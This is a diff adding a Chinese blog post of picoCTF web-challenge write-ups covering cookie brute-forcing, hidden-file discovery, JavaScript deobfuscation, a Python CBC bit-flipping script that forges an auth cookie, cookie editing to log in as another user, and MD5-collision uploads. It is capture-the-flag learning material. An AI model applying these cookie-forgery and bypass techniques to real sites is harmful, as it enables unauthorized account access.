@@ -164,6 +164,219 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-picoctf刷题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/16/picoctf%E5%88%B7%E9%A2%98/">picoctf刷题</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/01/16/picoctf%E5%88%B7%E9%A2%98/" class="archive-article-date">
+  	<time datetime="2022-01-16T10:03:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>cookies<br>看提示是Welcome to my cookie search page. See how much I like different kinds of cookies!<br>先抓包发现cookies的值为-1<br>底下的框的内容是snickerdoodle，输入试试<br>发现页面上显示I love snickerdoodle cookies!<br>然后抓包发现cookie的值为0，猜测是爆破数字（只是加了个重定向），然后爆破到18的时候出了flag</p>
+<p>GET aHEAD<br>又是文件协议，特容易被忽略<br>可使用协议如下：<br>GET： 请求指定的页面信息，并返回实体主体。<br>HEAD： 只请求页面的首部。<br>POST： 请求服务器接受所指定的文档作为对所标识的URI的新的从属实体。<br>PUT： 从客户端向服务器传送的数据取代指定的文档的内容。<br>DELETE： 请求服务器删除指定的页面。<br>OPTIONS： 允许客户端查看服务器的性能。<br>TRACE： 请求服务器在响应中的实体主体部分返回所得到的内容。<br>PATCH： 实体中包含一个表，表中说明与该URI所表示的原内容的区别。<br>MOVE： 请求服务器将指定的页面移至另一个网络地址。<br>COPY： 请求服务器将指定的页面拷贝至另一个网络地址<br>LINK： 请求服务器建立链接关系。<br>UNLINK： 断开链接关系。<br>WRAPPED： 允许客户端发送经过封装的请求。<br>Extension-mothed：在不改动协议的前提下，可增加另外的方法。</p>
+<p>Insp3ct0r<br>直接查看源代码，发现获得1/3的flag，然后提示这是html，三个分别在html，css，js中，直接打开上面的css，js，获得完整的flag</p>
+<p>Scavenger Hunt<br>方法和上一个差不多，只不过打开js发现是一句How can I keep Google from indexing my website?不是很理解应该怎么办，只能去扫目录，发现/robots.txt，/.DS_Store和/.htaccess/<br>出题人的意思应该是通过设置/robots.txt来阻止Google的索引，然后打开这个后提示I think this is an apache server… can you Access the next flag?<br>为了查看apache的配置而访问/.htaccess/，提示I love making websites on my Mac, I can Store a lot of information there.<br>然后通过mac的文件泄露联想到/.DS_Store，然后获取最后一部分flag</p>
+<p>Some Assembly Required 1<br>感觉就是闲的<br>打开以后是一个文本框，检查源代码看见一个js，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">const _0x402c&#x3D;[&#39;value&#39;,&#39;2wfTpTR&#39;,&#39;instantiate&#39;,&#39;275341bEPcme&#39;,&#39;innerHTML&#39;,&#39;1195047NznhZg&#39;,&#39;1qfevql&#39;,&#39;input&#39;,&#39;1699808QuoWhA&#39;,&#39;Correct!&#39;,&#39;check_flag&#39;,&#39;Incorrect!&#39;,&#39;.&#x2F;JIFxzHyW8W&#39;,&#39;23SMpAuA&#39;,&#39;802698XOMSrr&#39;,&#39;charCodeAt&#39;,&#39;474547vVoGDO&#39;,&#39;getElementById&#39;,&#39;instance&#39;,&#39;copy_char&#39;,&#39;43591XxcWUl&#39;,&#39;504454llVtzW&#39;,&#39;arrayBuffer&#39;,&#39;2NIQmVj&#39;,&#39;result&#39;];const _0x4e0e&#x3D;function(_0x553839,_0x53c021)&#123;_0x553839&#x3D;_0x553839-0x1d6;let _0x402c6f&#x3D;_0x402c[_0x553839];return _0x402c6f;&#125;;(function(_0x76dd13,_0x3dfcae)&#123;const _0x371ac6&#x3D;_0x4e0e;while(!![])&#123;try&#123;const _0x478583&#x3D;-parseInt(_0x371ac6(0x1eb))+parseInt(_0x371ac6(0x1ed))+-parseInt(_0x371ac6(0x1db))*-parseInt(_0x371ac6(0x1d9))+-parseInt(_0x371ac6(0x1e2))*-parseInt(_0x371ac6(0x1e3))+-parseInt(_0x371ac6(0x1de))*parseInt(_0x371ac6(0x1e0))+parseInt(_0x371ac6(0x1d8))*parseInt(_0x371ac6(0x1ea))+-parseInt(_0x371ac6(0x1e5));if(_0x478583&#x3D;&#x3D;&#x3D;_0x3dfcae)break;else _0x76dd13[&#39;push&#39;](_0x76dd13[&#39;shift&#39;]());&#125;catch(_0x41d31a)&#123;_0x76dd13[&#39;push&#39;](_0x76dd13[&#39;shift&#39;]());&#125;&#125;&#125;(_0x402c,0x994c3));let exports;(async()&#x3D;&gt;&#123;const _0x48c3be&#x3D;_0x4e0e;let _0x5f0229&#x3D;await fetch(_0x48c3be(0x1e9)),_0x1d99e9&#x3D;await WebAssembly[_0x48c3be(0x1df)](await _0x5f0229[_0x48c3be(0x1da)]()),_0x1f8628&#x3D;_0x1d99e9[_0x48c3be(0x1d6)];exports&#x3D;_0x1f8628[&#39;exports&#39;];&#125;)();function onButtonPress()&#123;const _0xa80748&#x3D;_0x4e0e;let _0x3761f8&#x3D;document[&#39;getElementById&#39;](_0xa80748(0x1e4))[_0xa80748(0x1dd)];for(let _0x16c626&#x3D;0x0;_0x16c626&lt;_0x3761f8[&#39;length&#39;];_0x16c626++)&#123;exports[_0xa80748(0x1d7)](_0x3761f8[_0xa80748(0x1ec)](_0x16c626),_0x16c626);&#125;exports[&#39;copy_char&#39;](0x0,_0x3761f8[&#39;length&#39;]),exports[_0xa80748(0x1e7)]()&#x3D;&#x3D;0x1?document[_0xa80748(0x1ee)](_0xa80748(0x1dc))[_0xa80748(0x1e1)]&#x3D;_0xa80748(0x1e6):document[_0xa80748(0x1ee)](_0xa80748(0x1dc))[_0xa80748(0x1e1)]&#x3D;_0xa80748(0x1e8);&#125;</span><br><span class="line">先进行简单的分割，以及把正经的16进制转换出来以便于阅读（因为_0x4e0e这个函数过于常见，所以一起换掉）：（sublime超级好用的js排版插件https:&#x2F;&#x2F;blog.csdn.net&#x2F;waterdemo&#x2F;article&#x2F;details&#x2F;38110863）</span><br><span class="line">const _0x402c &#x3D; [&quot;value&quot;, &quot;2wfTpTR&quot;, &quot;instantiate&quot;, &quot;275341bEPcme&quot;, &quot;innerHTML&quot;, &quot;1195047NznhZg&quot;, &quot;1qfevql&quot;, &quot;input&quot;, &quot;1699808QuoWhA&quot;, &quot;Correct!&quot;, &quot;check_flag&quot;, &quot;Incorrect!&quot;, &quot;.&#x2F;JIFxzHyW8W&quot;, &quot;23SMpAuA&quot;, &quot;802698XOMSrr&quot;, &quot;charCodeAt&quot;, &quot;474547vVoGDO&quot;, &quot;getElementById&quot;, &quot;instance&quot;, &quot;copy_char&quot;, &quot;43591XxcWUl&quot;, &quot;504454llVtzW&quot;, &quot;arrayBuffer&quot;, &quot;2NIQmVj&quot;, &quot;result&quot;];</span><br><span class="line">const _0x4e0e &#x3D; function(url, whensCollection) &#123;</span><br><span class="line">  &#x2F;** @type &#123;number&#125; *&#x2F;</span><br><span class="line">  url &#x3D; url - 470;</span><br><span class="line">  let _0x402c6f &#x3D; _0x402c[url];</span><br><span class="line">  return _0x402c6f;</span><br><span class="line">&#125;;</span><br><span class="line">(function(data, oldPassword) &#123;</span><br><span class="line">  const toMonths &#x3D; _0x4e0e;</span><br><span class="line">  for (; !![];) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      const userPsd &#x3D; -parseInt(toMonths(491)) + parseInt(toMonths(493)) + -parseInt(toMonths(475)) * -parseInt(toMonths(473)) + -parseInt(toMonths(482)) * -parseInt(toMonths(483)) + -parseInt(toMonths(478)) * parseInt(toMonths(480)) + parseInt(toMonths(472)) * parseInt(toMonths(490)) + -parseInt(toMonths(485));</span><br><span class="line">      if (userPsd &#x3D;&#x3D;&#x3D; oldPassword) &#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        data[&quot;push&quot;](data[&quot;shift&quot;]());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch (_0x41d31a) &#123;</span><br><span class="line">      data[&quot;push&quot;](data[&quot;shift&quot;]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)(_0x402c, 627907);</span><br><span class="line">let exports;</span><br><span class="line">(async() &#x3D;&gt; &#123;</span><br><span class="line">  const findMiddlePosition &#x3D; _0x4e0e;</span><br><span class="line">  let leftBranch &#x3D; await fetch(findMiddlePosition(489));</span><br><span class="line">  let rightBranch &#x3D; await WebAssembly[findMiddlePosition(479)](await leftBranch[findMiddlePosition(474)]());</span><br><span class="line">  let module &#x3D; rightBranch[findMiddlePosition(470)];</span><br><span class="line">  exports &#x3D; module[&quot;exports&quot;];</span><br><span class="line">&#125;)();</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @return &#123;undefined&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">function onButtonPress() &#123;</span><br><span class="line">  const navigatePop &#x3D; _0x4e0e;</span><br><span class="line">  let params &#x3D; document[&quot;getElementById&quot;](navigatePop(484))[navigatePop(477)];</span><br><span class="line">  for (let i &#x3D; 0; i &lt; params[&quot;length&quot;]; i++) &#123;</span><br><span class="line">    exports[navigatePop(471)](params[navigatePop(492)](i), i);</span><br><span class="line">  &#125;</span><br><span class="line">  exports[&quot;copy_char&quot;](0, params[&quot;length&quot;]);</span><br><span class="line">  if (exports[navigatePop(487)]() &#x3D;&#x3D; 1) &#123;</span><br><span class="line">    document[navigatePop(494)](navigatePop(476))[navigatePop(481)] &#x3D; navigatePop(486);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    document[navigatePop(494)](navigatePop(476))[navigatePop(481)] &#x3D; navigatePop(488);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
+<p>然后很容易发现，文本框调用了onButtonPress()函数，所以直接追这个函数就行<br>发现调用了大量的_0x4e0e函数（navigatePop）<br>阅读代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const _0x4e0e &#x3D; function(url, whensCollection) &#123;</span><br><span class="line">  &#x2F;** @type &#123;number&#125; *&#x2F;</span><br><span class="line">  url &#x3D; url - 470;</span><br><span class="line">  let _0x402c6f &#x3D; _0x402c[url];</span><br><span class="line">  return _0x402c6f;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>发现，逻辑是读取一个数字，减去470后在前面的_0x402c取字符串<br>所以导出对应关系：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">_0x4e0e(470)&#x3D;value</span><br><span class="line">&#39;value&#39; 470</span><br><span class="line">&#39;2wfTpTR&#39; 471</span><br><span class="line">&#39;instantiate&#39; 472</span><br><span class="line">&#39;275341bEPcme&#39; 473</span><br><span class="line">&#39;innerHTML&#39; 474</span><br><span class="line">&#39;1195047NznhZg&#39; 475</span><br><span class="line">&#39;1qfevql&#39; 476</span><br><span class="line">&#39;input&#39; 477</span><br><span class="line">&#39;1699808QuoWhA&#39; 478</span><br><span class="line">&#39;Correct!&#39; 479</span><br><span class="line">&#39;check_flag&#39; 480</span><br><span class="line">&#39;Incorrect!&#39; 481</span><br><span class="line">&#39;.&#x2F;JIFxzHyW8W&#39; 482</span><br><span class="line">&#39;23SMpAuA&#39; 483</span><br><span class="line">&#39;802698XOMSrr&#39; 484</span><br><span class="line">&#39;charCodeAt&#39; 485</span><br><span class="line">&#39;474547vVoGDO&#39; 486 </span><br><span class="line">&#39;getElementById&#39; 487</span><br><span class="line">&#39;instance&#39; 488</span><br><span class="line">&#39;copy_char&#39; 489</span><br><span class="line">&#39;43591XxcWUl&#39; 490</span><br><span class="line">&#39;504454llVtzW&#39; 491</span><br><span class="line">&#39;arrayBuffer&#39; 492</span><br><span class="line">&#39;2NIQmVj&#39; 493</span><br><span class="line">&#39;result&#39; 494</span><br><span class="line">然后是会先调用function(data, oldPassword)函数，对上面的数组进行打乱：</span><br><span class="line">函数内容为：</span><br><span class="line">(function(data, oldPassword) &#123;</span><br><span class="line">  const toMonths &#x3D; _0x4e0e;</span><br><span class="line">  for (; !![];) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      const userPsd &#x3D; -parseInt(&#39;504454llVtzW&#39;) + parseInt(&#39;2NIQmVj&#39;) + -parseInt(&#39;1195047NznhZg&#39;) * -parseInt(&#39;275341bEPcme&#39;) + -parseInt(&#39;.&#x2F;JIFxzHyW8W&#39;) * </span><br><span class="line">-parseInt(&#39;23SMpAuA&#39;) + -parseInt(&#39;1699808QuoWhA&#39;) * parseInt(&#39;check_flag&#39;) + parseInt(&#39;instantiate&#39;) * parseInt(&#39;43591XxcWUl&#39;) + -parseInt(&#39;charCodeAt&#39;);</span><br><span class="line">      if (userPsd &#x3D;&#x3D;&#x3D; oldPassword) &#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        data[&quot;push&quot;](data[&quot;shift&quot;]());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch (_0x41d31a) &#123;</span><br><span class="line">      data[&quot;push&quot;](data[&quot;shift&quot;]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)(_0x402c, 627907);</span><br></pre></td></tr></table></figure>
+<p>其中parseInt函数的作用是把字符串解析成数字：<a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-parseint.html">https://www.runoob.com/jsref/jsref-parseint.html</a><br>懒得手算，所以转换成JavaScript打印出转换的值，加入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var arr &#x3D; str.split(&quot; &quot;);</span><br><span class="line">for(var key in _0x402c)&#123;</span><br><span class="line"> document.writeln(arr[key]);</span><br></pre></td></tr></table></figure>
+
+
+<p>完善onButtonPress()函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(async() &#x3D;&gt; &#123;</span><br><span class="line">  const findMiddlePosition &#x3D; _0x4e0e;</span><br><span class="line">  let leftBranch &#x3D; await fetch(&quot;.&#x2F;JIFxzHyW8W&quot;);</span><br><span class="line">  let rightBranch &#x3D; await WebAssembly[&quot;instantiate&quot;](await leftBranch[&quot;arrayBuffer&quot;]());</span><br><span class="line">  let module &#x3D; rightBranch[&quot;instance&quot;];</span><br><span class="line">  exports &#x3D; module[&quot;exports&quot;];</span><br><span class="line">&#125;)();</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @return &#123;undefined&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">function onButtonPress() &#123;</span><br><span class="line">  const navigatePop &#x3D; _0x4e0e;</span><br><span class="line">  let params &#x3D; document[&quot;getElementById&quot;](&quot;input&quot;)[&quot;value&quot;];</span><br><span class="line">  for (let i &#x3D; 0; i &lt; params[&quot;length&quot;]; i++) &#123;</span><br><span class="line">    exports[&quot;copy_char&quot;](params[&quot;charCodeAt&quot;](i), i);</span><br><span class="line">  &#125;</span><br><span class="line">  exports[&quot;copy_char&quot;](0, params[&quot;length&quot;]);</span><br><span class="line">  if (exports[&quot;check_flag&quot;]() &#x3D;&#x3D; 1) &#123;</span><br><span class="line">    document[&quot;getElementById&quot;](&quot;result&quot;)[&quot;innerHTML&quot;] &#x3D; &quot;Correct!&quot;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    document[&quot;getElementById&quot;](&quot;result&quot;)[&quot;innerHTML&quot;] &#x3D; &quot;Incorrect!&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>然后我们发现：没什么卵用。<br>无非就是输对了代码以后会显示correct，输错了会显示incorrect<br>然后回去看题目，提到了Assembly，也就是混淆这玩意的东西，所以可能是让我们找混淆这玩意的代码，直接F12,调到source，发现有个wasm，那就是代码的混淆规则，在最后找到了flag</p>
+<p>实际上：因为那一大堆字符串里面只有一个./JIFxzHyW8W像路径，按路径去试的话，一下子就出来了</p>
+<p>More Cookies<br>因为涉及密码学的知识，所以完全是知识盲区</p>
+<p>似乎是利用了AES CBC这种加密方法<br>简单了解了一下，发现这似乎并不完全算是“加密”，而是“生成”<br>这种算法是，假如我有一串字符串A<br>将A经过Base64加密，生成B<br>随机生成两个数a和b（a&lt;=128,b&lt;=128）<br>将B的第a个字符（换成ascii码）异或b（换成字符），生成C<br>然后C再进行一次base64加密，得到D，就是我们最后获取的cookie</p>
+<p>所以，由p XOR q = r 推出 p XOR r = q 得逆运算：<br>cookie用base64解密得C<br>C的第a个字符异或b得到B<br>B再被base64解密得到A，就是需要的cookie</p>
+<p>所以爆破脚本：<br>#!/usr/bin/python2<br>import requests<br>import base64</p>
+<p>s=requests.Session()<br>s.get(“<a target="_blank" rel="noopener" href="http://mercury.picoctf.net:43275/&quot;">http://mercury.picoctf.net:43275/&quot;</a>)<br>cookie=s.cookies[“auth_name”]<br>print(cookie)<br>unb64=base64.b64decode(cookie)<br>print(unb64)<br>unb64b=base64.b64decode(unb64)<br>for i in range (0,128):<br>   pos=i//8<br>   guessdec=unb64b[0:pos]+chr(ord(unb64b[pos])^(1&lt;&lt;(i%8)))+unb64b[pos+1:]<br>   guessenc1 = base64.b64encode(guessdec)<br>   guess=base64.b64encode(base64.b64encode(guessdec))<br>   r=requests.get(“<a target="_blank" rel="noopener" href="http://mercury.picoctf.net:43275/&quot;,cookies=%7B&quot;auth_name&quot;">http://mercury.picoctf.net:43275/&quot;,cookies={&quot;auth_name&quot;</a>: guess})<br>   if “pico” in r.text:<br>       print(r.text)</p>
+<p>where are the robots<br>估计是考robots.txt，试了试发现内容是User-agent: * Disallow: /1bb4c.html，直接访问拿到flag</p>
+<p>login<br>离谱<br>先是用什么账号和密码都能登上去，提示是登录Joe的账号，事实上只有Joe登不上去<br>尝试sql注入失败，估计不会爆破就没试<br>结果正确方法是：<br>先随便用一个账号和密码登录，发现cookie的内容为<br>username=123<br>password=456<br>456=False<br>所以把username的值改为Joe，把False改成True后刷新，就出flag了</p>
+<p>dont-use-client-side<br>打开后是个输入框，尝试输几个都失败了，看源码，发现前端代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function verify() &#123;</span><br><span class="line">   checkpass &#x3D; document.getElementById(&quot;pass&quot;).value;</span><br><span class="line">   split &#x3D; 4;</span><br><span class="line">   if (checkpass.substring(0, split) &#x3D;&#x3D; &#39;pico&#39;) &#123;</span><br><span class="line">     if (checkpass.substring(split*6, split*7) &#x3D;&#x3D; &#39;706c&#39;) &#123;</span><br><span class="line">       if (checkpass.substring(split, split*2) &#x3D;&#x3D; &#39;CTF&#123;&#39;) &#123;</span><br><span class="line">        if (checkpass.substring(split*4, split*5) &#x3D;&#x3D; &#39;ts_p&#39;) &#123;</span><br><span class="line">         if (checkpass.substring(split*3, split*4) &#x3D;&#x3D; &#39;lien&#39;) &#123;</span><br><span class="line">           if (checkpass.substring(split*5, split*6) &#x3D;&#x3D; &#39;lz_b&#39;) &#123;</span><br><span class="line">             if (checkpass.substring(split*2, split*3) &#x3D;&#x3D; &#39;no_c&#39;) &#123;</span><br><span class="line">               if (checkpass.substring(split*7, split*8) &#x3D;&#x3D; &#39;5&#125;&#39;) &#123;</span><br><span class="line">                 alert(&quot;Password Verified&quot;)</span><br><span class="line">                 &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             &#125;</span><br><span class="line">     </span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   else &#123;</span><br><span class="line">     alert(&quot;Incorrect password&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>很明显，输入正确的字符串就是flag，所以这个时候最简单的方法就是：拿这一大堆字符串去爆破flag<br>picoCTF{ 和 5}都给了，要爆破的也就只有五个（开玩笑的）<br>直接看也不难，就是个拼接（数数）<br>pico<br>CTF{<br>no_c<br>lien<br>ts_p<br>lz_b<br>706c<br>5}</p>
+<p>It is my Birthday<br>打开以后要上传两个文件，盲猜是要碰撞了，但不知道是什么碰撞<br>所以先传两个试试<br>发现需要传pdf，那就传<br>发现Files are not different! 那就传不一样的<br>回显MD5 hashes do not match!<br>猜的没错，md5碰撞<br>随便从网上找两个抄上去<br>然后就出答案了，而且非常贴心的给了源码！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;submit&quot;])) &#123;</span><br><span class="line">    $type1 &#x3D; $_FILES[&quot;file1&quot;][&quot;type&quot;];</span><br><span class="line">    $type2 &#x3D; $_FILES[&quot;file2&quot;][&quot;type&quot;];</span><br><span class="line">    $size1 &#x3D; $_FILES[&quot;file1&quot;][&quot;size&quot;];</span><br><span class="line">    $size2 &#x3D; $_FILES[&quot;file2&quot;][&quot;size&quot;];</span><br><span class="line">    $SIZE_LIMIT &#x3D; 18 * 1024;</span><br><span class="line"></span><br><span class="line">    if (($size1 &lt; $SIZE_LIMIT) &amp;&amp; ($size2 &lt; $SIZE_LIMIT)) &#123;</span><br><span class="line">        if (($type1 &#x3D;&#x3D; &quot;application&#x2F;pdf&quot;) &amp;&amp; ($type2 &#x3D;&#x3D; &quot;application&#x2F;pdf&quot;)) &#123;</span><br><span class="line">            $contents1 &#x3D; file_get_contents($_FILES[&quot;file1&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">            $contents2 &#x3D; file_get_contents($_FILES[&quot;file2&quot;][&quot;tmp_name&quot;]);</span><br><span class="line"></span><br><span class="line">            if ($contents1 !&#x3D; $contents2) &#123;</span><br><span class="line">                if (md5_file($_FILES[&quot;file1&quot;][&quot;tmp_name&quot;]) &#x3D;&#x3D; md5_file($_FILES[&quot;file2&quot;][&quot;tmp_name&quot;])) &#123;</span><br><span class="line">                    highlight_file(&quot;index.php&quot;);</span><br><span class="line">                    die();</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    echo &quot;MD5 hashes do not match!&quot;;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;Files are not different!&quot;;</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;Not a PDF!&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;File too large!&quot;;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; FLAG: picoCTF&#123;c0ngr4ts_u_r_1nv1t3d_aebcbf39&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;It is my Birthday&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;maxcdn.bootstrapcdn.com&#x2F;bootstrap&#x2F;3.2.0&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;getbootstrap.com&#x2F;docs&#x2F;3.3&#x2F;examples&#x2F;jumbotron-narrow&#x2F;jumbotron-narrow.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;3.3.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script 